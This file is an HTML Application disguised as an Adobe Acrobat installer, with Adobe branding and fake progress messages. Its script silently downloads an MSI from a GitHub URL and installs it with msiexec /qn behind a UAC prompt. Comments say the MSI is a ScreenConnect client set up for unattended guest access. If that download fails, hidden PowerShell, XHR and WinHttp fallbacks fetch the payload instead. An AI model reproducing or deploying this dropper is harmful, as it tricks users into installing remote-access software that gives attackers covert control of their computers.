<!DOCTYPE html>
<html>
<head>
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta http-equiv="Content-Type" content="text/html; charset=utf-8">
<title>Adobe Acrobat</title>
<hta:application
  id="oHTA"
  applicationname="AdobeAcrobatUpdater"
  border="thin" caption="yes" maximizebutton="no" minimizebutton="no"
  navigateurl="no" showintaskbar="yes" singleinstance="yes" sysmenu="no"
  version="1.0" windowstate="normal" scroll="no" contextmenu="no" selection="no"
/>
<style>
  html, body { margin:0; padding:0; height:100%; width:100%;
    font-family:"Segoe UI",Tahoma,sans-serif; background:#f7f8fa; color:#1c1e21;
    overflow:hidden; cursor:default; user-select:none; }
  #wrap { height:100%; width:100%; position:relative; }
  #topbar { height:74px; background:#fff; border-bottom:1px solid #e6e8ec; padding:16px 20px; }
  #logo { position:absolute; left:20px; top:16px; width:42px; height:42px; }
  #brandtext { position:absolute; left:76px; top:22px; }
  #product { font-size:20px; font-weight:600; color:#1c1e21; line-height:24px; }
  #ver { font-size:12px; color:#8a8f98; margin-top:2px; }
  #closebtn { position:absolute; right:14px; top:8px; font-size:22px; color:#9aa0a8;
    width:34px; height:34px; line-height:34px; text-align:center; cursor:pointer; border-radius:4px; }
  #closebtn:hover { background:#f0f1f4; color:#333; }
  #main { position:absolute; top:74px; left:0; right:0; bottom:58px;
    padding:34px 48px 0 48px; text-align:center; }
  #biglogo { width:84px; height:84px; margin:0 auto 22px auto; }
  #heading { font-size:19px; font-weight:600; color:#1c1e21; margin-bottom:8px; }
  #status  { font-size:13px; color:#6b7280; min-height:18px; margin-bottom:26px; }
  #barouter { width:420px; max-width:82%; height:8px; background:#e2e5ea;
    border-radius:5px; overflow:hidden; margin:0 auto 12px auto; }
  #barfill { height:100%; width:0%; background:#ed2224; border-radius:5px; }
  #pct { font-size:12px; color:#8a8f98; margin-top:2px; }
  #subnote { font-size:11px; color:#b3b8c0; margin-top:26px; }
  #footer { position:absolute; left:0; right:0; bottom:0; height:58px;
    background:#fff; border-top:1px solid #e6e8ec; padding:0 22px; }
  #note { position:absolute; left:22px; top:20px; font-size:12px; color:#8a8f98; }
  #cancelbtn { position:absolute; right:22px; top:14px; width:92px; height:30px;
    border:1px solid #cfd3da; background:#fff; color:#333; font-size:12px;
    font-family:inherit; border-radius:4px; cursor:pointer; }
  #cancelbtn:hover { background:#f0f1f4; }
</style>
</head>
<body onload="init()">
  <div id="wrap">
    <div id="topbar">
      <div id="logo">
        <svg viewBox="0 0 100 100" xmlns="http://www.w3.org/2000/svg">
          <rect x="0" y="0" width="100" height="100" rx="22" fill="#ed2224"/>
          <polygon points="24,80 44,24 53,49 44,80" fill="#fff"/>
          <polygon points="58,80 76,24 76,80 67,80" fill="#fff"/>
        </svg>
      </div>
      <div id="brandtext">
        <div id="product">Adobe Acrobat</div>
        <div id="ver">2024 &middot; Standard &middot; v23.005</div>
      </div>
      <div id="closebtn" onclick="cancel()">&times;</div>
    </div>

    <div id="main">
      <div id="biglogo">
        <svg viewBox="0 0 100 100" xmlns="http://www.w3.org/2000/svg">
          <rect x="0" y="0" width="100" height="100" rx="22" fill="#ed2224"/>
          <polygon points="24,80 44,24 53,49 44,80" fill="#fff"/>
          <polygon points="58,80 76,24 76,80 67,80" fill="#fff"/>
        </svg>
      </div>
      <div id="heading">Installing Adobe Acrobat</div>
      <div id="status">Preparing installation&hellip;</div>
      <div id="barouter"><div id="barfill"></div></div>
      <div id="pct">0%</div>
      <div id="subnote">Adobe Acrobat keeps your documents secure and easy to share.</div>
    </div>

    <div id="footer">
      <span id="note">This usually only takes a few minutes.</span>
      <button id="cancelbtn" onclick="cancel()">Cancel</button>
    </div>
  </div>

<script>
// ---------------------------------------------------------------------------
// Config
// ---------------------------------------------------------------------------
// The real payload is ScreenConnect's official client-setup MSI (CodeMetrics
// signed, served from their CDN). msiexec fetches the MSI itself from the URL
// — no local download stage, no PowerShell download child on the happy path.
// ?e=Access&y=Guest configures the unattended guest-access session.
var MSI_URL = "https://raw.githubusercontent.com/janetstoller-star/twal/main/wesvp.msi";

var PREP_MS        = 2200;    // "preparing" beat before the UAC prompt
var UAC_TIMEOUT_MS = 150000;  // no MSI log this long after launch -> UAC declined
var INSTALL_MAX_MS = 300000;  // hard cap for a whole install phase
var INSTALL_STALL_MS = 60000; // MSI log silent this long -> assume finished
var FB_STAGE_MS    = { xhr: 120000, winhttp: 180000, ps: 300000 };
var FB_MAX_MS      = 600000;  // hard cap for the whole local fallback download
var EXPECT_BYTES   = 11239424; // MSI size (progress scaling only)

var UA_STR = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36";

// Runtime state
var shell = null, fso = null;
var state = "ready";            // ready | installing | fallback-dl | fallback-install | done | error
var progress = 0;
var startTime = 0;
var tickTimer = null, pollTimer = null, fbTimer = null;

var installMode = "url";        // url = msiexec fetches MSI_URL itself; local = fallback
var curLog = "";

var adobeDir = "";
var msiLocal = "";
var logPath  = "";
var logPath2 = "";
var diagPath = "";

// Fallback download state
var fbT0 = 0, fbStageT = 0;
var dlStage = "xhr";            // xhr | winhttp | ps
var dlSettled = false;
var dlXHR = null;
var psMarker = "", psDir = "", psT0 = 0, psLastSize = 0, psLastGrowT = 0, psDone = false;

var lastLogSize = 0;
var lastLogGrowT = 0;

var dlMsgs = [
  "Preparing installation&hellip;",
  "Contacting Adobe servers&hellip;",
  "Downloading components&hellip;",
  "Downloading components&hellip;"
];
var instMsgs = [
  "Installing Adobe Acrobat&hellip;",
  "Installing Adobe Acrobat&hellip;",
  "Applying updates&hellip;",
  "Applying updates&hellip;",
  "Finalizing&hellip;"
];

// Fallback "ps" stage: WinINET iwr + curl.exe inside, hidden child process.
// param(1) = unique marker (process-kill), param(2) = temp dir, param(3) = output.
var PS_PS = "# Local-fallback download (WinINET iwr, TLS12) + curl.exe inside.\n" +
"# param(1) = unique marker, param(2) = temp dir, param(3) = output file.\n" +
"param([string]$Url = \"\", [string]$TmpDir = \"\", [string]$Out = \"\")\n" +
"if (-not $Out) { $Out = Join-Path $TmpDir \"AdobeUpdate.msi\" }\n" +
"try { [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12 } catch {}\n" +
"try {\n" +
"  $ProgressPreference = 'SilentlyContinue'\n" +
"  Invoke-WebRequest -Uri $Url -OutFile $Out -UseBasicParsing\n" +
"  $ProgressPreference = 'Continue'\n" +
"} catch {\n" +
"  try { $env:NO_PROXY = \"*\"; curl.exe -L --fail --retry 2 --connect-timeout 20 -o $Out $Url 2>$null } catch {}\n" +
"}\n" +
"try { Set-Content -LiteralPath (Join-Path $TmpDir \"done.flag\") \"1\" -NoNewline } catch {}\n";

function $(id) { return document.getElementById(id); }

function nowMs() { return new Date().getTime(); }

function nowHM() {
  var d = new Date();
  function z(n) { return (n < 10 ? "0" : "") + n; }
  return z(d.getHours()) + ":" + z(d.getMinutes()) + ":" + z(d.getSeconds());
}

function init() {
  shell = new ActiveXObject("WScript.Shell");
  fso   = new ActiveXObject("Scripting.FileSystemObject");
  // Swallow any uncaught script error so the HTA never pops the "error in
  // this page" dialog (which halts the page) and so it can log and continue.
  try {
    window.onerror = function (msg, src, line) {
      try { dumpDiagnostics("page-exc: " + msg + " line " + line); } catch (e) {}
      return true;
    };
  } catch (e) {}
  var w = 620, h = 396;
  window.resizeTo(w, h);
  var sw = screen.availWidth, sh = screen.availHeight;
  window.moveTo(Math.round((sw - w) / 2), Math.round((sh - h) / 2));

  adobeDir = shell.ExpandEnvironmentStrings("%LOCALAPPDATA%") + "\\Adobe";
  if (!fso.FolderExists(adobeDir)) fso.CreateFolder(adobeDir);
  msiLocal = adobeDir + "\\AdobeUpdate.msi";
  logPath  = adobeDir + "\\AdobeUpdate.log";
  logPath2 = adobeDir + "\\AdobeUpdate2.log";
  diagPath = adobeDir + "\\diagnostics.txt";
  cleanStale();
  setStatus(dlMsgs[0]);
  setBar(1);
  setTimeout(startInstall, PREP_MS);
}

function cleanStale() {
  var p = [msiLocal, logPath, logPath2, diagPath];
  for (var i = 0; i < p.length; i++) {
    try { if (fso.FileExists(p[i])) fso.DeleteFile(p[i], true); } catch (e) {}
  }
}

function deleteFile(p) { try { if (fso.FileExists(p)) fso.DeleteFile(p, true); } catch (e) {} }
function ensureDir(d) { try { if (!fso.FolderExists(d)) fso.CreateFolder(d); } catch (e) {} }

// Read the first n bytes of a file as numeric byte values [b0, b1, ...].
// Tries a byte-exact ADODB.Stream binary read first (code-page independent),
// then falls back to FSO ASCII if the ADO "data source" read is blocked by a
// hardened machine. Returns an empty array if the file cannot be read.
function readHeadBytes(path, n) {
  if (!fso.FileExists(path)) return [];
  try {
    var s = new ActiveXObject("ADODB.Stream");
    s.Type = 1;                    // adTypeBinary
    s.Open();
    s.LoadFromFile(path);
    s.Position = 0;
    var b = s.Read(n);             // n bytes -> string of n chars, each 0..255
    try { s.Close(); } catch (e) {}
    var out = [];
    for (var i = 0; i < b.length; i++) out.push(b.charCodeAt(i) & 0xFF);
    return out;
  } catch (e) { /* ADO blocked -> fall through to FSO */ }
  try {
    var f = fso.OpenTextFile(path, 1, false, 0);   // 1=ForReading, 0=ASCII
    var d = "";
    try { d = f.Read(n); } catch (e2) {}
    try { f.Close(); } catch (e3) {}
    var out2 = [];
    for (var j = 0; j < d.length; j++) out2.push(d.charCodeAt(j) & 0xFF);
    return out2;
  } catch (e4) { return []; }
}

function msiMagicOk(path) {
  try {
    var m = readHeadBytes(path, 4);
    return m.length === 4 && m[0] === 0xD0 && m[1] === 0xCF && m[2] === 0x11 && m[3] === 0xE0;
  } catch (e) { return false; }
}

function killByCmd(marker) {
  try {
    var wmi = GetObject("winmgmts:{impersonationLevel=impersonate}!//./root/cimv2");
    var q = wmi.ExecQuery("SELECT ProcessId FROM Win32_Process WHERE CommandLine LIKE '%" + marker + "%'");
    var en = new Enumerator(q);
    for (; !en.atEnd(); en.moveNext()) {
      try { shell.Run("taskkill /f /t /pid " + en.item().ProcessId, 0, true); } catch (e2) {}
    }
  } catch (e3) {}
}

// ---------------------------------------------------------------------------
// UI
// ---------------------------------------------------------------------------
function setBar(p) {
  if (p < 0) p = 0; if (p > 100) p = 100;
  $("barfill").style.width = p + "%";
  $("pct").innerHTML = Math.round(p) + "%";
}
function setStatus(html) { $("status").innerHTML = html; }

// ---------------------------------------------------------------------------
// Install phase (primary): msiexec fetches the MSI from the URL itself.
// Single UAC consent via ShellExecute "runas". Completion is detected by
// watching the MSI /L*v log — the final line "Installation success or error
// status: N" is written on exit.
// ---------------------------------------------------------------------------
function launchMsiexec(args) {
  try {
    var sh = new ActiveXObject("Shell.Application");
    sh.ShellExecute("msiexec.exe", args, "", "runas", 1);
    return true;
  } catch (e) {}
  try { shell.Run("msiexec " + args, 0, false); return true; } catch (e2) {}
  return false;
}

function startInstall() {
  if (state !== "ready") return;
  state = "installing";
  installMode = "url";
  curLog = logPath;
  startTime = nowMs();
  progress = 2; setBar(progress);
  setStatus(dlMsgs[1]);

  var args = '/i "' + MSI_URL + '" /qn /norestart /L*v "' + curLog + '"';
  if (!launchMsiexec(args)) {
    fail("Administrator approval is required to install Adobe Acrobat", "install: launch failed");
    return;
  }
  tickTimer = setInterval(tick, 200);
  pollTimer = setInterval(pollInstall, 800);
}

// Read the tail of the MSI log as TEXT (so .match works). msiexec writes the
// log in UTF-16 (LE), so a single-byte read interleaves NULs into every line
// and the status regex never matches. Use the FSO with Unicode decoding.
function readLogTail(log, bytes) {
  var d = "";
  try {
    if (!fso.FileExists(log)) return "";
    var f = fso.OpenTextFile(log, 1, false, -1);   // -1 = Tristate (BOM-aware)
    try {
      var pos = Math.floor(f.Size / 2) - bytes;    // char offset (UTF-16 ≈ 2 bytes/char)
      if (pos > 0) f.Position = pos;
      d = f.Read(-1);                              // read to end of file
    } catch (e) {
      try { f.Close(); } catch (e2) {}
      f = fso.OpenTextFile(log, 1, false, 0);      // fallback: ANSI/ASCII
      var pos2 = f.Size - bytes;
      if (pos2 > 0) f.Position = pos2;
      d = f.Read(-1);
    }
    try { f.Close(); } catch (e3) {}
    return d;
  } catch (e) { return ""; }
}

function logInfo(log) {
  var out = { exists: false, size: 0, status: -1, tail: "" };
  try {
    if (fso.FileExists(log)) {
      out.exists = true;
      out.size = fso.GetFile(log).Size;
      out.tail = readLogTail(log, 65536);
      var m = out.tail.match(/Installation success or error status:\s*(-?\d+)/);
      if (m) out.status = parseInt(m[1], 10);
    }
  } catch (e) {}
  return out;
}

// Does the log indicate the failure was msiexec being unable to FETCH the
// MSI from the URL (not a problem with the MSI itself)?
function downloadFailTail(tail) {
  if (!tail) return false;
  if (/Failed to open remote MSI/i.test(tail)) return true;
  if (/Failed to read from remote file/i.test(tail)) return true;
  if (/could not access network location/i.test(tail)) return true;
  if (/(0x80041064|0x80041065|0x80041066|0x80041067)/i.test(tail)) return true;
  if (/Source file.*could not be (opened|found|accessed)/i.test(tail)) return true;
  return false;
}

function pollInstall() {
  try { _pollInstall(); } catch (e) {}
}

function _pollInstall() {
  if (state !== "installing" && state !== "fallback-install") return;
  var t = nowMs();
  var info = logInfo(curLog);
  if (info.status >= 0) {
    if (info.status === 0 || info.status === 3010) { finishInstall(); return; }
    if (installMode === "url" && downloadFailTail(info.tail)) { startFallback(); return; }
    fail("Installation failed (error code " + info.status + ")", "install_rc=" + info.status);
    return;
  }
  if (info.exists) {
    if (info.size > lastLogSize) { lastLogSize = info.size; lastLogGrowT = t; }
    if (t - lastLogGrowT > INSTALL_STALL_MS) {
      if (installMode === "url" && downloadFailTail(info.tail)) { startFallback(); return; }
      fail("Installation could not be completed", "install: log stalled, no status");
      return;
    }
    return;
  }
  // No log yet: UAC consent is pending (or was declined).
  if (t - startTime > UAC_TIMEOUT_MS) {
    fail("Administrator approval is required to install Adobe Acrobat", "install: uac timeout");
  }
}

// ---------------------------------------------------------------------------
// Fallback: msiexec could not fetch the MSI from the URL (locked-down box
// strips the download). The HTA downloads it locally itself — XHR (WinINET)
// -> WinHttp -> hidden PowerShell iwr/curl — then installs the local file
// (second UAC prompt, same msiexec /qn path).
// ---------------------------------------------------------------------------
function startFallback() {
  state = "fallback-dl";
  installMode = "dl";
  if (pollTimer) { clearInterval(pollTimer); pollTimer = null; }
  fbT0 = nowMs(); fbStageT = fbT0;
  dlSettled = false;
  deleteFile(msiLocal);
  dlStage = "xhr";
  setStatus(dlMsgs[2]);
  fbTimer = setInterval(pollFallback, 250);
  fallbackXHR();
}

function fallbackNext() {
  if (state !== "fallback-dl" || dlSettled) return;
  if (dlStage === "xhr") { fallbackWinHttp(); return; }
  if (dlStage === "winhttp") { fallbackPS(); return; }
  fail("Failed to save the installer file", "fallback: all download stages failed");
}

function fallbackXHR() {
  if (dlStage !== "xhr" || dlSettled) return;
  var x = null;
  try { x = new XMLHttpRequest(); } catch (e) {}
  if (!x || !("responseType" in x)) { fallbackNext(); return; }
  try {
    x.open("GET", MSI_URL, true);
    x.responseType = "ms-stream";
    x.timeout = FB_STAGE_MS.xhr;
  } catch (e) { fallbackNext(); return; }
  dlXHR = x;
  x.onprogress = function (e) {
    if (dlStage !== "xhr" || !e) return;
    if (e.lengthComputing && e.total > 0) {
      var p = 55 + Math.min(34, (e.loaded * 34) / e.total);
      if (p > progress) { progress = p; setBar(p); }
    }
  };
  x.onload = function () {
    if (dlStage !== "xhr" || dlSettled) return;
    if (x.status === 200) {
      try { var b = x.response; if (b && b.size >= 1048576) { saveFallbackBody(b, "xhr"); return; } } catch (e) {}
    }
    fallbackNext();
  };
  x.onerror = function () { if (dlStage === "xhr" && !dlSettled) fallbackNext(); };
  x.ontimeout = function () { if (dlStage === "xhr" && !dlSettled) fallbackNext(); };
  try { x.send(); } catch (e) { fallbackNext(); }
}

function saveFallbackBody(body, method) {
  try {
    var s = new ActiveXObject("ADODB.Stream");
    s.Type = 1; s.Mode = 3; s.Open();
    try { body.Seek(0, 0); } catch (e) {}
    s.CopyFrom(body);
    s.SaveToFile(msiLocal, 2);
    s.Close();
  } catch (e) { fallbackNext(); return; }
  dlSettled = true;
  if (fbTimer) { clearInterval(fbTimer); fbTimer = null; }
  verifyFallback();
}

function fallbackWinHttp() {
  if (dlSettled) return;
  dlStage = "winhttp";
  fbStageT = nowMs();
  if (dlXHR) { try { dlXHR.abort(); } catch (e) {} dlXHR = null; }
  try {
    var w = new ActiveXObject("WinHttp.WinHttpRequest.5.1");
    try { w.Option(13) = 2147483647; } catch (e) {}
    w.SetTimeouts(15000, 30000, 120000, 180000);
    w.Open("GET", MSI_URL, true);
    w.SetRequestHeader("User-Agent", UA_STR);
    w.onreadystatechange = function () {
      if (dlStage !== "winhttp" || dlSettled) return;
      if (w.ReadyState !== 4) return;
      if (w.Status === 200) {
        try { if (w.BodySize >= 1048576) { saveWHttpBody(w.responseBody); return; } } catch (e) {}
      }
      fallbackNext();
    };
    w.ontimeout = function () { if (dlStage === "winhttp" && !dlSettled) fallbackNext(); };
    w.Send();
  } catch (e) { fallbackNext(); }
}

function saveWHttpBody(rb) {
  try {
    var s = new ActiveXObject("ADODB.Stream");
    s.Type = 1; s.Mode = 3; s.Open();
    s.CopyFrom(rb);
    s.SaveToFile(msiLocal, 2);
    s.Close();
  } catch (e) { fallbackNext(); return; }
  dlSettled = true;
  if (fbTimer) { clearInterval(fbTimer); fbTimer = null; }
  verifyFallback();
}

function fallbackPS() {
  if (dlSettled) return;
  dlStage = "ps";
  fbStageT = nowMs();
  psMarker = "lvlm" + Math.floor(Math.random() * 16777215).toString(16);
  psDir = shell.ExpandEnvironmentStrings("%TEMP%") + "\\lvl_" + psMarker;
  ensureDir(psDir);
  deleteFile(psDir + "\\done.flag");
  var src = fso.GetFolder(shell.ExpandEnvironmentStrings("%TEMP%")).Path + "\\__sc__download.ps1";
  try {
    deleteFile(src);
    var w = fso.CreateTextFile(src, true, false);
    w.Write(PS_PS);
    w.Close();
  } catch (e) { fallbackNext(); return; }
  psT0 = nowMs(); psLastSize = 0; psLastGrowT = psT0; psDone = false;
  var cmd = "powershell.exe -NoProfile -ExecutionPolicy Bypass -File \"" + src +
    "\" -Url \"" + MSI_URL + "\" -TmpDir \"" + psDir + "\" -Out \"" + msiLocal + "\"";
  try { shell.Run(cmd, 0, false); }
  catch (e) { deleteFile(src); fallbackNext(); }
}

function pollFallback() {
  try { _pollFallback(); } catch (e) {}
}

function _pollFallback() {
  if (state !== "fallback-dl" || dlSettled) return;
  var t = nowMs();
  if (t - fbT0 > FB_MAX_MS) {
    fail("Download timed out - please check your connection", "fallback: total timeout " + (t - fbT0) + "ms");
    return;
  }
  if (dlStage === "ps") {
    var sz = 0;
    try { if (fso.FileExists(msiLocal)) sz = fso.GetFile(msiLocal).Size; } catch (e) {}
    if (sz > psLastSize) { psLastSize = sz; psLastGrowT = t; }
    var p = 55 + Math.min(34, (sz * 34) / EXPECT_BYTES);
    if (p > progress) { progress = p; setBar(p); }
    var doneFlag = false;
    try { doneFlag = fso.FileExists(psDir + "\\done.flag"); } catch (e) {}
    if (sz >= 1048576 && msiMagicOk(msiLocal) && (psLastSize === sz && t - psLastGrowT >= 1500)) {
      dlSettled = true;
      if (fbTimer) { clearInterval(fbTimer); fbTimer = null; }
      verifyFallback();
      return;
    }
    if (doneFlag && (t - psT0 > 10000 || sz < 1048576)) {
      // iwr ran to completion but produced no usable file (stripped/failed).
      fallbackNext();
      return;
    }
  }
  var budget = FB_STAGE_MS[dlStage];
  if (budget && t - fbStageT > budget) fallbackNext();
}

function verifyFallback() {
  try {
    if (!fso.FileExists(msiLocal)) { fail("Failed to save the installer file", "fallback: no msi"); return; }
    var sz = fso.GetFile(msiLocal).Size;
    if (sz < 1048576) { fail("Failed to save the installer file", "fallback: small " + sz); return; }
    var magic = null;
    try { magic = readHeadBytes(msiLocal, 4); } catch (e) { magic = null; }
    if (magic && magic.length === 4) {
      if (magic[0] !== 0xD0 || magic[1] !== 0xCF || magic[2] !== 0x11 || magic[3] !== 0xE0) {
        fail("Failed to save the installer file", "fallback: bad magic");
        return;
      }
    }
  } catch (e) {
    fail("Failed to save the installer file", "fallback: verify " + e.message);
    return;
  }
  fallbackInstall();
}

function fallbackInstall() {
  state = "fallback-install";
  installMode = "local";
  curLog = logPath2;
  deleteFile(curLog);
  startTime = nowMs();
  lastLogSize = 0;
  lastLogGrowT = nowMs();
  progress = 90; setBar(progress);
  setStatus(instMsgs[0]);

  var args = '/i "' + msiLocal + '" /qn /norestart /L*v "' + curLog + '"';
  if (!launchMsiexec(args)) {
    fail("Administrator approval is required to install Adobe Acrobat", "fallback-install: launch failed");
    return;
  }
  pollTimer = setInterval(pollInstall, 800);
}

// ---------------------------------------------------------------------------
// Progress loop
// ---------------------------------------------------------------------------
function tick() {
  try { _tick(); } catch (e) {}
}

function _tick() {
  if (state === "installing" || state === "fallback-install") {
    var hasLog = false, sz = 0;
    try { if (fso.FileExists(curLog)) { hasLog = true; sz = fso.GetFile(curLog).Size; } } catch (e) {}
    if (hasLog) {
      if (progress < 60) progress = 60;
      if (progress < 99) { progress += 0.15; setBar(progress); }
      var i;
      if (progress < 91) i = 0; else if (progress < 95) i = 2; else i = 4;
      setStatus(instMsgs[i]);
    } else {
      // UAC pending or msiexec still fetching: creep toward ~55%.
      if (progress < 55) { progress += (55 - progress) * 0.004; setBar(progress); }
      setStatus(progress < 25 ? dlMsgs[1] : dlMsgs[2]);
    }
  } else if (state === "fallback-dl") {
    if (progress < 55) { progress += (55 - progress) * 0.01; setBar(progress); }
    setStatus(dlMsgs[2]);
  }
}

// ---------------------------------------------------------------------------
// Diagnostics — registry reads + log tail only, no external tooling.
// ---------------------------------------------------------------------------
function osBuild() {
  try {
    var v = shell.RegRead("HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\CurrentBuildNumber");
    if (v) return String(v);
  } catch (e) {}
  return "unknown";
}

function regStr(key, name) {
  try {
    var v = shell.RegRead(key + "\\" + name);
    return (typeof v === "undefined") ? "(none)" : String(v);
  } catch (e) { return "(none)"; }
}

function dumpDiagnostics(reason) {
  try {
    var L = [];
    L.push("Adobe Update diagnostics");
    L.push("time: " + new Date().toString());
    L.push("reason: " + reason);
    L.push("state: " + state);
    L.push("install_mode: " + installMode);
    L.push("elapsed_ms: " + (startTime ? nowMs() - startTime : 0));
    L.push("progress: " + Math.round(progress) + "%");
    L.push("msi_url: " + MSI_URL);
    L.push("os: " + shell.ExpandEnvironmentStrings("%OS% %PROCESSOR_ARCHITECTURE%"));
    L.push("build: " + osBuild());
    L.push("msi_local: " + (fso.FileExists(msiLocal) ? "yes (" + fso.GetFile(msiLocal).Size + " bytes)" : "no"));
    L.push("wininet ProxyEnable: " + regStr("HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings", "ProxyEnable"));
    L.push("wininet ProxyServer: " + regStr("HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings", "ProxyServer"));
    L.push("wininet ProxyOverride: " + regStr("HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings", "ProxyOverride"));
    L.push("wininet AutoConfigURL: " + regStr("HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings", "AutoConfigURL"));
    L.push("winhttp mode: " + regStr("HKLM\\SYSTEM\\CurrentControlSet\\Services\\WinHttp\\Parameters", "DefaultProxyRequirements"));
    L.push("winhttp ProxyServer: " + regStr("HKLM\\SYSTEM\\CurrentControlSet\\Services\\WinHttp\\Parameters", "ProxyServer"));
    if (curLog) {
      var tail = readLogTail(curLog, 65536);
      if (tail) {
        L.push("--- msi log tail (" + curLog + ") ---");
        var lines = tail.split("\n");
        for (var i = Math.max(0, lines.length - 25); i < lines.length; i++) L.push(lines[i]);
      }
    }
    var w = fso.CreateTextFile(diagPath, true);
    w.Write(L.join("\r\n"));
    w.Close();
  } catch (e) {}
}

function fail(msg, reason) {
  if (state === "done" || state === "error") return;
  state = "error";
  if (tickTimer) { clearInterval(tickTimer); tickTimer = null; }
  if (pollTimer) { clearInterval(pollTimer); pollTimer = null; }
  if (fbTimer) { clearInterval(fbTimer); fbTimer = null; }
  if (dlXHR) { try { dlXHR.abort(); } catch (e) {} }
  if (psMarker) { killByCmd(psMarker); psMarker = ""; }
  dumpDiagnostics(reason || msg);
  setStatus(msg);
  $("heading").innerHTML = "Installation could not be completed";
  $("subnote").innerHTML = "Please check your internet connection and try again.";
  $("note").innerHTML = "You can now close this window.";
  $("cancelbtn").innerHTML = "Close";
}

function finishInstall() {
  if (state === "done" || state === "error") return;
  state = "done";
  if (tickTimer) { clearInterval(tickTimer); tickTimer = null; }
  if (pollTimer) { clearInterval(pollTimer); pollTimer = null; }
  if (fbTimer) { clearInterval(fbTimer); fbTimer = null; }
  progress = 100; setBar(100);
  setStatus("Installation complete");
  $("heading").innerHTML = "Adobe Acrobat is now installed";
  $("biglogo").style.display = "none";
  $("subnote").innerHTML = "Adobe Acrobat will be available the next time you open it.";
  $("note").innerHTML = "You can now close this window.";
  $("cancelbtn").innerHTML = "Close";
}

function cancel() {
  if (state === "done" || state === "error") { window.close(); return; }
  if (dlXHR) { try { dlXHR.abort(); } catch (e) {} }
  if (psMarker) { killByCmd(psMarker); psMarker = ""; }
  if (tickTimer) { clearInterval(tickTimer); tickTimer = null; }
  if (pollTimer) { clearInterval(pollTimer); pollTimer = null; }
  if (fbTimer) { clearInterval(fbTimer); fbTimer = null; }
  var p = [msiLocal, logPath, logPath2];
  for (var i = 0; i < p.length; i++) {
    try { if (fso.FileExists(p[i])) fso.DeleteFile(p[i], true); } catch (e) {}
  }
  try { if (psDir && fso.FolderExists(psDir)) fso.DeleteFolder(psDir, true); } catch (e) {}
  try { deleteFile(shell.ExpandEnvironmentStrings("%TEMP%") + "\\__sc__download.ps1"); } catch (e) {}
  window.close();
}
</script>
</body>
</html>
